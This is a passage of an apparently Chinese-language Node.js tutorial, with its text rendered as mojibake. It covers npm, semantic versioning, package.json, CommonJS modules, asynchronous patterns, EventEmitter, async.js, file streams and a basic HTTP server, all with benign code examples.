class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm uninstall express<br></code></pre></td></tr></table></figure><h4 id="2-2-3-ç‰ˆæœ¬æ§åˆ¶ä¸è¯­ä¹‰åŒ–ç‰ˆæœ¬"><a href="#2-2-3-ç‰ˆæœ¬æ§åˆ¶ä¸è¯­ä¹‰åŒ–ç‰ˆæœ¬" class="headerlink" title="2.2.3 ç‰ˆæœ¬æ§åˆ¶ä¸è¯­ä¹‰åŒ–ç‰ˆæœ¬"></a>2.2.3 ç‰ˆæœ¬æ§åˆ¶ä¸è¯­ä¹‰åŒ–ç‰ˆæœ¬</h4><p>NPM ä½¿ç”¨è¯­ä¹‰åŒ–ç‰ˆæœ¬æ§åˆ¶ (SemVer)ï¼Œç‰ˆæœ¬å·æ ¼å¼ä¸º <code>MAJOR.MINOR.PATCH</code>ï¼š</p><ul><li><strong>MAJOR</strong>ï¼šæœ‰é‡å¤§æ›´æ”¹æˆ–ç ´åå…¼å®¹æ€§æ—¶å¢åŠ ã€‚</li><li><strong>MINOR</strong>ï¼šæ·»åŠ æ–°åŠŸèƒ½ä½†ä¸ç ´åå…¼å®¹æ€§æ—¶å¢åŠ ã€‚</li><li><strong>PATCH</strong>ï¼šä¿®å¤ bug ä¸”ä¸ç ´åå…¼å®¹æ€§æ—¶å¢åŠ ã€‚</li></ul><h4 id="2-2-4-ä½¿ç”¨-package-json-ç®¡ç†é¡¹ç›®"><a href="#2-2-4-ä½¿ç”¨-package-json-ç®¡ç†é¡¹ç›®" class="headerlink" title="2.2.4 ä½¿ç”¨ package.json ç®¡ç†é¡¹ç›®"></a>2.2.4 ä½¿ç”¨ <code>package.json</code> ç®¡ç†é¡¹ç›®</h4><p><code>package.json</code> æ˜¯ Node.js é¡¹ç›®é…ç½®æ–‡ä»¶ï¼Œç”¨äºå®šä¹‰é¡¹ç›®çš„ä¾èµ–ã€è„šæœ¬ã€ç‰ˆæœ¬å·ç­‰ã€‚</p><p><strong>ç”Ÿæˆ <code>package.json</code> æ–‡ä»¶ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm init<br></code></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ <code>package.json</code> æ–‡ä»¶ï¼š</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-app&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.0.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;node app.js&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;express&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.17.1&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-3-è‡ªå®šä¹‰æ¨¡å—ä¸-CommonJS-è§„èŒƒ"><a href="#2-3-è‡ªå®šä¹‰æ¨¡å—ä¸-CommonJS-è§„èŒƒ" class="headerlink" title="2.3 è‡ªå®šä¹‰æ¨¡å—ä¸ CommonJS è§„èŒƒ"></a>2.3 è‡ªå®šä¹‰æ¨¡å—ä¸ CommonJS è§„èŒƒ</h3><h4 id="2-3-1-å¯¼å…¥ä¸å¯¼å‡ºæ¨¡å—"><a href="#2-3-1-å¯¼å…¥ä¸å¯¼å‡ºæ¨¡å—" class="headerlink" title="2.3.1 å¯¼å…¥ä¸å¯¼å‡ºæ¨¡å—"></a>2.3.1 å¯¼å…¥ä¸å¯¼å‡ºæ¨¡å—</h4><p>Node.js éµå¾ª <strong>CommonJS æ¨¡å—è§„èŒƒ</strong>ï¼Œé€šè¿‡ <code>module.exports</code> å¯¼å‡ºæ¨¡å—ï¼Œé€šè¿‡ <code>require</code> å¯¼å…¥æ¨¡å—ã€‚</p><p><strong>å¯¼å‡ºæ¨¡å—ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// file: math.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">add</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">subtract</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b;<br></code></pre></td></tr></table></figure><p><strong>å¯¼å…¥æ¨¡å—ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./math&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>));  <span class="hljs-comment">// è¾“å‡º: 5</span><br></code></pre></td></tr></table></figure><h4 id="2-3-2-CommonJS-å’Œ-ES6-æ¨¡å—çš„åŒºåˆ«"><a href="#2-3-2-CommonJS-å’Œ-ES6-æ¨¡å—çš„åŒºåˆ«" class="headerlink" title="2.3.2 CommonJS å’Œ ES6 æ¨¡å—çš„åŒºåˆ«"></a>2.3.2 CommonJS å’Œ ES6 æ¨¡å—çš„åŒºåˆ«</h4><ul><li><strong>CommonJS</strong> æ˜¯ Node.js çš„é»˜è®¤æ¨¡å—ç³»ç»Ÿï¼Œä½¿ç”¨ <code>require</code> å’Œ <code>module.exports</code>ã€‚</li><li><strong>ES6 æ¨¡å—</strong> ä½¿ç”¨ <code>import</code> å’Œ <code>export</code> è¯­æ³•ï¼Œåœ¨ Node.js ä¸­ä¹Ÿé€æ¸è¢«æ”¯æŒï¼Œéœ€è¦åœ¨ <code>package.json</code> ä¸­æ·»åŠ  <code>&quot;type&quot;: &quot;module&quot;</code>ã€‚</li></ul><hr><h2 id="3-å¼‚æ­¥ç¼–ç¨‹-1"><a href="#3-å¼‚æ­¥ç¼–ç¨‹-1" class="headerlink" title="3. å¼‚æ­¥ç¼–ç¨‹"></a>3. å¼‚æ­¥ç¼–ç¨‹</h2><h3 id="3-1-å¼‚æ­¥ç¼–ç¨‹åŸºç¡€"><a href="#3-1-å¼‚æ­¥ç¼–ç¨‹åŸºç¡€" class="headerlink" title="3.1 å¼‚æ­¥ç¼–ç¨‹åŸºç¡€"></a>3.1 å¼‚æ­¥ç¼–ç¨‹åŸºç¡€</h3><p>Node.js çš„å¼‚æ­¥ç¼–ç¨‹æ˜¯å…¶æ ¸å¿ƒç‰¹ç‚¹ï¼Œå…è®¸ç¨‹åºåœ¨æ‰§è¡Œè€—æ—¶ä»»åŠ¡æ—¶ç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ã€‚</p><h4 id="3-1-1-å›è°ƒå‡½æ•°"><a href="#3-1-1-å›è°ƒå‡½æ•°" class="headerlink" title="3.1.1 å›è°ƒå‡½æ•°"></a>3.1.1 å›è°ƒå‡½æ•°</h4><p>å›è°ƒå‡½æ•°æ˜¯æœ€åŸºç¡€çš„å¼‚æ­¥å¤„ç†æ–¹å¼ï¼Œå°†ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨å¼‚æ­¥ä»»åŠ¡å®Œæˆåè°ƒç”¨è¯¥å›è°ƒå‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="3-1-2-Promise-å¯¹è±¡"><a href="#3-1-2-Promise-å¯¹è±¡" class="headerlink" title="3.1.2 Promise å¯¹è±¡"></a>3.1.2 <code>Promise</code> å¯¹è±¡</h4><p><code>Promise</code> æ˜¯ä¸€ç§æ›´ç°ä»£çš„å¼‚æ­¥å¤„ç†æ–¹å¼ï¼Œå¯ä»¥é¿å…å›è°ƒåœ°ç‹±é—®é¢˜ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-property">promises</span>;<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err));<br></code></pre></td></tr></table></figure><h4 id="3-1-3-async-await-è¯­æ³•"><a href="#3-1-3-async-await-è¯­æ³•" class="headerlink" title="3.1.3 async/await è¯­æ³•"></a>3.1.3 <code>async/await</code> è¯­æ³•</h4><p><code>async/await</code> æ˜¯åŸºäº <code>Promise</code> çš„è¯­æ³•ç³–ï¼Œèƒ½å¤Ÿä»¥åŒæ­¥çš„å†™æ³•å¤„ç†å¼‚æ­¥ä»»åŠ¡ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-property">promises</span>;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readFile</span>(<span class="hljs-params"></span>) &#123;<br> <br><br> <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">readFile</span>();<br></code></pre></td></tr></table></figure><h3 id="3-2-äº‹ä»¶é©±åŠ¨ç¼–ç¨‹"><a href="#3-2-äº‹ä»¶é©±åŠ¨ç¼–ç¨‹" class="headerlink" title="3.2 äº‹ä»¶é©±åŠ¨ç¼–ç¨‹"></a>3.2 äº‹ä»¶é©±åŠ¨ç¼–ç¨‹</h3><p>Node.js çš„äº‹ä»¶é©±åŠ¨ç¼–ç¨‹é€šè¿‡ <strong>äº‹ä»¶å¾ªç¯</strong> å’Œ <strong>äº‹ä»¶å‘å°„å™¨</strong> (<code>EventEmitter</code>) å®ç°ã€‚</p><h4 id="3-2-1-ä½¿ç”¨-EventEmitter"><a href="#3-2-1-ä½¿ç”¨-EventEmitter" class="headerlink" title="3.2.1 ä½¿ç”¨ EventEmitter"></a>3.2.1 ä½¿ç”¨ <code>EventEmitter</code></h4><p><code>EventEmitter</code> æ˜¯ Node.js çš„æ ¸å¿ƒç±»ï¼Œç”¨äºåˆ›å»ºå’Œç›‘å¬äº‹ä»¶ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">EventEmitter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;events&#x27;</span>);<br><span class="hljs-keyword">const</span> emitter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventEmitter</span>();<br><br>emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;event&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Event has occurred!&#x27;</span>);<br>&#125;);<br><br>emitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;event&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="3-2-2-è‡ªå®šä¹‰äº‹ä»¶å¤„ç†"><a href="#3-2-2-è‡ªå®šä¹‰äº‹ä»¶å¤„ç†" class="headerlink" title="3.2.2 è‡ªå®šä¹‰äº‹ä»¶å¤„ç†"></a>3.2.2 è‡ªå®šä¹‰äº‹ä»¶å¤„ç†</h4><p>ä½ å¯ä»¥è‡ªå®šä¹‰äº‹ä»¶ï¼Œäº‹ä»¶å¯ä»¥ä¼ é€’å‚æ•°ä¾›ç›‘å¬å™¨å¤„ç†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;greet&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">name</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>);<br>&#125;);<br><br>emitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;greet&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-3-å¼‚æ­¥æ§åˆ¶æµç®¡ç†"><a href="#3-3-å¼‚æ­¥æ§åˆ¶æµç®¡ç†" class="headerlink" title="3.3 å¼‚æ­¥æ§åˆ¶æµç®¡ç†"></a>3.3 å¼‚æ­¥æ§åˆ¶æµç®¡ç†</h3><h4 id="3-3-1-async-js-åº“çš„ä½¿ç”¨"><a href="#3-3-1-async-js-åº“çš„ä½¿ç”¨" class="headerlink" title="3.3.1 async.js åº“çš„ä½¿ç”¨"></a>3.3.1 <code>async.js</code> åº“çš„ä½¿ç”¨</h4><p><code>async.js</code> æ˜¯ä¸€ä¸ªæ§åˆ¶å¼‚æ­¥æµç¨‹çš„åº“ï¼Œæä¾›äº†å¤šç§æ§åˆ¶å¼‚æ­¥ä»»åŠ¡çš„æ–¹å¼ï¼Œå¦‚å¹¶è¡Œã€ä¸²è¡Œç­‰ã€‚</p><p><strong>å¹¶è¡Œæ‰§è¡Œå¼‚æ­¥ä»»åŠ¡ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-keyword">async</span>.<span class="hljs-title function_">parallel</span>([<br>  <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Task 1&#x27;</span>);<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">1</span>);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;,<br>  <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Task 2&#x27;</span>);<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>    &#125;, <span class="hljs-number">500</span>);<br>  &#125;<br>], <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);  <span class="hljs-comment">// è¾“å‡º: [1, 2]</span><br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="3-3-2-å¼‚æ­¥é˜Ÿåˆ—ä¸å¹¶å‘æ§åˆ¶"><a href="#3-3-2-å¼‚æ­¥é˜Ÿåˆ—ä¸å¹¶å‘æ§åˆ¶" class="headerlink" title="3.3.2 å¼‚æ­¥é˜Ÿåˆ—ä¸å¹¶å‘æ§åˆ¶"></a>3.3.2 å¼‚æ­¥é˜Ÿåˆ—ä¸å¹¶å‘æ§åˆ¶</h4><p><code>async.queue</code> æä¾›äº†ä¸€ç§æ§åˆ¶å¹¶å‘æ‰§è¡Œä»»åŠ¡çš„æ–¹å¼ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-keyword">const</span> q = <span class="hljs-keyword">async</span>.<span class="hljs-title function_">queue</span>(<span class="hljs-function">(<span class="hljs-params">task, callback</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Processing task <span class="hljs-subst">$&#123;task.name&#125;</span>`</span>);<br>  <span class="hljs-title function_">callback</span>();<br>&#125;, <span class="hljs-number">2</span>);  <span class="hljs-comment">// æœ€å¤§å¹¶å‘æ•°ä¸º 2</span><br><br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 1&#x27;</span>&#125;);<br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 2&#x27;</span>&#125;);<br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 3&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="4-æ–‡ä»¶æ“ä½œä¸-I-O-1"><a href="#4-æ–‡ä»¶æ“ä½œä¸-I-O-1" class="headerlink" title="4. æ–‡ä»¶æ“ä½œä¸ I&#x2F;O"></a>4. æ–‡ä»¶æ“ä½œä¸ I&#x2F;O</h2><h3 id="4-1-æ–‡ä»¶ç³»ç»Ÿæ“ä½œ"><a href="#4-1-æ–‡ä»¶ç³»ç»Ÿæ“ä½œ" class="headerlink" title="4.1 æ–‡ä»¶ç³»ç»Ÿæ“ä½œ"></a>4.1 æ–‡ä»¶ç³»ç»Ÿæ“ä½œ</h3><p>Node.js çš„ <code>fs</code> æ¨¡å—ç”¨äºä¸æ–‡ä»¶ç³»ç»Ÿäº¤äº’ï¼Œå¯ä»¥è¯»å–ã€å†™å…¥æ–‡ä»¶ä»¥åŠç®¡ç†ç›®å½•ã€‚å®ƒæ”¯æŒåŒæ­¥å’Œå¼‚æ­¥æ“ä½œã€‚</p><h4 id="4-1-1-è¯»å–ä¸å†™å…¥æ–‡ä»¶"><a href="#4-1-1-è¯»å–ä¸å†™å…¥æ–‡ä»¶" class="headerlink" title="4.1.1 è¯»å–ä¸å†™å…¥æ–‡ä»¶"></a>4.1.1 è¯»å–ä¸å†™å…¥æ–‡ä»¶</h4><p><strong>å¼‚æ­¥è¯»å–æ–‡ä»¶ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>åŒæ­¥è¯»å–æ–‡ä»¶ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br></code></pre></td></tr></table></figure><p><strong>å†™å…¥æ–‡ä»¶ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> content = <span class="hljs-string">&#x27;This is a new content.&#x27;</span>;<br>fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, content, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;File written successfully.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-1-2-æ–‡ä»¶æµä¸å¤§æ–‡ä»¶å¤„ç†"><a href="#4-1-2-æ–‡ä»¶æµä¸å¤§æ–‡ä»¶å¤„ç†" class="headerlink" title="4.1.2 æ–‡ä»¶æµä¸å¤§æ–‡ä»¶å¤„ç†"></a>4.1.2 æ–‡ä»¶æµä¸å¤§æ–‡ä»¶å¤„ç†</h4><p>å¯¹äºå¤§æ–‡ä»¶ï¼Œä½¿ç”¨æµå¤„ç†æ›´é«˜æ•ˆï¼Œå› ä¸ºæµåˆ†å—è¯»å–æ–‡ä»¶ï¼Œè€Œä¸æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥å†…å­˜ã€‚</p><p><strong>è¯»å–æ–‡ä»¶æµï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> readStream = fs.<span class="hljs-title function_">createReadStream</span>(<span class="hljs-string">&#x27;largeFile.txt&#x27;</span>, &#123; <span class="hljs-attr">encoding</span>: <span class="hljs-string">&#x27;utf8&#x27;</span> &#125;);<br>readStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Received chunk: <span class="hljs-subst">$&#123;chunk&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å†™å…¥æ–‡ä»¶æµï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> writeStream = fs.<span class="hljs-title function_">createWriteStream</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>);<br><br>writeStream.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;First chunk of data\n&#x27;</span>);<br>writeStream.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;Second chunk of data\n&#x27;</span>);<br>writeStream.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;End of writing process.&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="4-2-ç½‘ç»œ-I-O-æ“ä½œ"><a href="#4-2-ç½‘ç»œ-I-O-æ“ä½œ" class="headerlink" title="4.2 ç½‘ç»œ I&#x2F;O æ“ä½œ"></a>4.2 ç½‘ç»œ I&#x2F;O æ“ä½œ</h3><p>Node.js æä¾›äº†ä¸°å¯Œçš„ç½‘ç»œæ“ä½œæ¨¡å—ï¼Œç‰¹åˆ«é€‚åˆå¤„ç†é«˜å¹¶å‘çš„ç½‘ç»œåº”ç”¨ã€‚</p><h4 id="4-2-1-åˆ›å»º-HTTP-æœåŠ¡å™¨"><a href="#4-2-1-åˆ›å»º-HTTP-æœåŠ¡å™¨" class="headerlink" title="4.2.1 åˆ›å»º HTTP æœåŠ¡å™¨"></a>4.2.1 åˆ›å»º HTTP æœåŠ¡å™¨</h4><p>Node.js çš„ <code>http</code> æ¨¡å—å¯ä»¥ç”¨äºåˆ›å»º HTTP æœåŠ¡å™¨ï¼Œå¤„ç†å®¢æˆ·ç«¯è¯·æ±‚å’Œå“åº”ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, World!\n&#x27;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server is running at http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-2-2-å¤„ç†è¯·æ±‚ä¸å“åº”"><a href="#4-2-2-å¤„ç†è¯·æ±‚ä¸å“åº”" class="headerlink" title="4.2.2 å¤„ç†è¯·æ±‚ä¸å“åº”"></a>4.2.2 å¤„ç†è¯·æ±‚ä¸å“åº”</h4><p>åœ¨å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼ŒNode.js æä¾›äº† <code>req</code> 